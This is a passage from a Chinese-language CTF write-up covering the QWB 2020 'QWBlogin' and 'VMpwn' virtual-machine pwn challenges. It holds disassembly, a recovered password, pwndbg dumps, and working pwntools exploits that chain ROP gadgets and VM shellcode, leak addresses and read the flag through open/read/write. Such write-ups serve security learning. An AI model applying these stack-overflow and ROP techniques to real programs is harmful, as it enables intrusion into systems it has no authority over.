class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">xor</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x77</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x26</span>| Q<span class="hljs-keyword">jne</span> <span class="hljs-number">0xffffffc9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x48</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x50</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x58</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x60</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x21</span><span class="hljs-keyword">syscall</span> data| read(<span class="hljs-number">0</span>, data[<span class="hljs-number">0x40</span>], <span class="hljs-number">0x21</span>)<span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]| G00DR3VR<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x427234129827abcd</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x10240740dc179b8a</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x48</span>]| W31LD0N3<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x127412341241dead</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x213a22705e70edfa</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x50</span>]| Try2Pwn!<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x8634965812abc123</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa75ae10820d2b377</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x58</span>]| GOGOGOGO<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x123216781236789a</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x5d75593f5d7137dd</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x34</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x6</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> r17<span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> r17, r16<span class="hljs-keyword">sub</span> r16, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x100</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r4</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa214f474f4721</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x574f4e54494e5750</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0xf</span><span class="hljs-keyword">syscall</span> stack<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">r4</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x800</span><span class="hljs-keyword">syscall</span> stack| read(<span class="hljs-number">0</span>, stack[], <span class="hljs-number">0x800</span>)<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0</span>         <span class="hljs-keyword">jnl</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">r0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">r4</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> r16, r17      <span class="hljs-keyword">pop</span> <span class="hljs-built_in">qword</span> r17<span class="hljs-keyword">ret</span></code></pre><p>于是程序就比较清晰了，如果输入了<code>password</code>为<code>QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO</code>就能走到最后溢出的地方</p><p>最后在<code>read(0, stack, 0x800)</code>的地方会出现溢出，然后在<code>ret</code>的时候把栈上的内容<code>pop</code>到<code>vm.pc</code>，于是就需要在<code>test.bin</code>里面找到可以用<code>gadgets</code></p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h4><p>在程序<code>RET</code>之后还有一大段无关的<code>opcode</code>，做到这步的时候才知道，这些就是为了凑<code>gadgets</code>的</p><p>其中标记为<code>R</code>的是不需要限制的</p><pre><code class="hljs python"><span class="hljs-comment"># 0x0d 0xR6 0x00 0x11 0xRR</span>pop_r00_ret = <span class="hljs-number">0x2f5</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x01 0X11 0xRR</span>pop_r01_ret = <span class="hljs-number">0x377</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x02 0x11 0xRR</span>pop_r02_ret = <span class="hljs-number">0x45c</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x03 0x11 0xRR</span>pop_r03_ret = <span class="hljs-number">0x4e1</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x20 0x0a 0x11 0xRR</span>sys_open_ret = <span class="hljs-number">0x6ed</span><span class="hljs-comment"># 0x20 0xR8 0x11 0xRR</span>sys_data_ret = <span class="hljs-number">0x5b1</span><span class="hljs-comment"># 0x20 0xR9 0x11 0xRR</span>sys_stack_ret = <span class="hljs-number">0x617</span></code></pre><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>由于<code>syscall</code>中只有<code>open | read | write | close</code>可用，很自然想到<code>orw</code>，然后构造<code>rop</code>链就行了，其中由于最开始打开了<code>test.bin</code>文件，所以<code>fd=4</code>，最初写<code>exp</code>的时候被坑了一下，以及调试的时候希望能有结构体的符号，我编译了<code>struct.c =&gt; struct.o</code>再在调试的时候<code>add-symbol-file struct.o 0</code>即可</p><pre><code class="hljs python">payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x108</span><span class="hljs-comment"># read(0, data[0x100], 0x20)</span><span class="hljs-comment"># r00 = 1 r01 = 0 r02 = 0x100 r03 = 0x20</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">1</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x20</span>)payload += p64(sys_data_ret)<span class="hljs-comment"># open(data[0x100], 0)</span><span class="hljs-comment"># r00 = 0 r01 = 0x200 r02 = 0</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0</span>)payload += p64(sys_open_ret)<span class="hljs-comment"># read(4, data[0x100], 0x30)</span><span class="hljs-comment"># r00 = 1 r01 = 4 r02 = 0x100 r03 = 0x30</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">1</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x4</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x30</span>)payload += p64(sys_data_ret)<span class="hljs-comment"># write(1, data[0x100], 0x30)</span><span class="hljs-comment"># r00 = 2 r01 = 1 r02 = 0x100 r03 = 0x30</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">2</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x1</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x30</span>)payload += p64(sys_data_ret)</code></pre><p>强的大佬，不需要<code>instruction.h</code>都能在5个小时内做出来，而我就是只菜鸡</p><p><a href="https://github.com/Vang3lis/CTF_repo/tree/master/QWB_2020/QWBlogin">QWBlogin 题目</a></p><h2 id="VMpwn"><a href="#VMpwn" class="headerlink" title="VMpwn"></a>VMpwn</h2><p>这个题目跟上一个题目一样先逆向，但是这个题目跟<code>QWBlogin</code>相比实现<code>vm</code>的时候简单一些</p><p>其中有一个 <code>chunk 0x30</code>用来记录寄存器的值<code>vm[0] vm[1] vm[2]</code> 类似<code>rdi, rsi, rdx</code>在<code>syscall</code>时会用到，<code>vm[3]</code>为<code>sp</code>，<code>vm[5]</code>为 <code>pc</code></p><p>在最后的关键操作为对于<code>read(0, stack, 0x1000)</code>（栈只有<code>0x100</code>个字节）</p><pre><code class="hljs assembly">pwndbg&gt; distance 0x555555759050 0x55555575ad680x555555759050-&gt;0x55555575ad68 is 0x1d18 bytes (0x3a3 words) RAX  0x7ffff7b156c0 (read) ◂— cmp    dword ptr [rip + 0x2c3039], 0 ► 0x5555555555db    call   rax &lt;0x7ffff7b156c0&gt;        fd: 0x0        buf: 0x55555575ad68 ◂— 0x0        nbytes: 0x1000pwndbg&gt; telescope 0x55555575801000:0000│   0x555555758010 ◂— 0x001:0008│   0x555555758018 —▸ 0x55555575ad68 ◂— 0x002:0010│   0x555555758020 ◂— 0x100003:0018│   0x555555758028 —▸ 0x55555575ad68 ◂— 0x004:0020│   0x555555758030 ◂— 0x005:0028│   0x555555758038 —▸ 0x5555557572d6 ◂— 0x772c6b6f11028f10</code></pre><p>然后<code>puts(stack)</code>，可以看到该虚拟栈上有<code>heap</code>地址和<code>elf</code>地址，但是只能泄漏一个</p><pre><code class="hljs assembly">pwndbg&gt; telescope 0x55555575ad68 0x3000:0000│ rsi  0x55555575ad68 ◂— &#39;1234454636\n&#39;01:0008│      0x55555575ad70 ◂— 0xa3633 &#x2F;* &#39;36\n&#39; *&#x2F;02:0010│      0x55555575ad78 ◂— 0x0... ↓1e:00f0│      0x55555575ae58 —▸ 0x555555758050 ◂— 0x20746168772c6b6f (&#39;ok,what &#39;)1f:00f8│      0x55555575ae60 ◂— 0x020:0100│      0x55555575ae68 —▸ 0x555555757851 ◂— 0xff</code></pre><p>接下来同第一步的<code>read(0, stack, 0x1000)</code> <code>write(0, stack, 0x20)</code>然后<code>ret</code></p><p>这个程序中有一个两个比较奇怪的地方，由于<code>ret</code>的时候程序的实现，是将<code>sp-=8</code>，但是<code>PUSH</code>为<code>sp-=8</code> <code>POP</code>为<code>sp+=8</code>，因此<code>ret</code>的时候比较奇怪，另外就是与<code>QWBlogin</code>相比没有 什么能用的<code>gadget</code>，因此想法只能为按照<code>vm</code>的规则，写<code>shellocde</code>，然后在最后<code>ret</code>的时候跳转过去，但是该题用 <code>seccomp</code>限制了只能 <code>orw</code>，且没有给<code>open</code>的 <code>syscall</code>只能泄漏</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>因此思路就是，先利用<code>puts</code>泄漏<code>elf</code>的地址，然后再<code>ret</code>到最初<code>elf_code+0x3</code>然后再泄漏<code>heap</code>，<code>ret</code>到写入栈上的<code>shellcode</code></p><p>利用<code>puts</code>泄漏<code>libc</code>，然后再次输入到栈上，利用<code>\x6d: mov reg[0], 0</code>作为<code>nop</code>，编写<code>shellcode</code></p><p>然后将<code>open</code>写入<code>free</code>的位置，因此在调用<code>syscall 03</code>时就是调用<code>open</code>，最后利用<code>orw</code>进行读取<code>flag</code></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="hljs python"><span class="hljs-comment"># heap+0x2e68 =&gt; elf_bss</span>io.sendafter(<span class="hljs-string">&quot;name:&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0xff</span>+<span class="hljs-string">&quot;#&quot;</span>)io.recvuntil(<span class="hljs-string">&quot;#&quot;</span>)elf.address = u64(io.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">&quot;\x00\x00&quot;</span>) - <span class="hljs-number">0x203851</span>success(<span class="hljs-string">&quot;elf&quot;</span>, elf.address)<span class="hljs-comment"># 0xf8 + ret </span>io.sendafter(<span class="hljs-string">&quot;say:&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x100</span> + p64(elf.address + <span class="hljs-number">0x203023</span>))io.sendafter(<span class="hljs-string">&quot;name:&quot;</span>, <span class="hljs-string">&quot;\x50&quot;</span>)heap = u64(io.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">&quot;\x00\x00&quot;</span>) - <span class="hljs-number">0x50</span>success(<span class="hljs-string">&quot;heap&quot;</span>, heap)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">mov reg[0], read_got</span><span class="hljs-string">puts</span><span class="hljs-string">mov reg[0], 0</span><span class="hljs-string">mov reg[1], heap + addr</span><span class="hljs-string">mov reg[2], 0x1000</span><span class="hljs-string">read        </span><span class="hljs-string">//  use 0x6d: mov reg[0], 0 as nop</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>payload = <span class="hljs-string">&quot;\x11&quot;</span> + p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])payload += <span class="hljs-string">&quot;\x8f\x02&quot;</span>payload += <span class="hljs-string">&quot;\x6d&quot;</span>payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(heap+<span class="hljs-number">0x2d60</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x1000</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;A&quot;</span>)payload += p64(heap+<span class="hljs-number">0x2d60</span>)io.sendafter(<span class="hljs-string">&quot;say:&quot;</span>, payload)io.recvuntil(<span class="hljs-string">&quot;bye~\n&quot;</span>)libc.address = u64(io.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>)) - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">flag</span><span class="hljs-string">0x6d * 0x50</span><span class="hljs-string">mov reg[1], elf.address+0x203900</span><span class="hljs-string">mov reg[2], 8</span><span class="hljs-string">read</span><span class="hljs-string">mov reg[0], heap+0x2d60</span><span class="hljs-string">mov reg[1], 0</span><span class="hljs-string">open</span><span class="hljs-string">mov reg[0], 3</span><span class="hljs-string">mov reg[1], bss</span><span class="hljs-string">mov reg[2], 0x30</span><span class="hljs-string">read</span><span class="hljs-string">mov reg[0], 1</span><span class="hljs-string">mov reg[1], bss</span><span class="hljs-string">mov reg[2], 0x30</span><span class="hljs-string">write</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>payload = <span class="hljs-string">&quot;flag\x00&quot;</span>payload = payload.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">&quot;\x6d&quot;</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.address+<span class="hljs-number">0x2038f8</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">8</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(heap+<span class="hljs-number">0x2d60</span>)payload += <span class="hljs-string">&quot;\x6e&quot;</span>payload += <span class="hljs-string">&quot;\x8f\x03&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(<span class="hljs-number">3</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.bss()+<span class="hljs-number">0x400</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x30</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(<span class="hljs-number">1</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.bss()+<span class="hljs-number">0x400</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x30</span>)payload += <span class="hljs-string">&quot;\x8f\x01&quot;</span>io.send(payload)sleep(<span class="hljs-number">0.03</span>)io.send(p64(libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]))io.interactive()io.close()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>vm</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
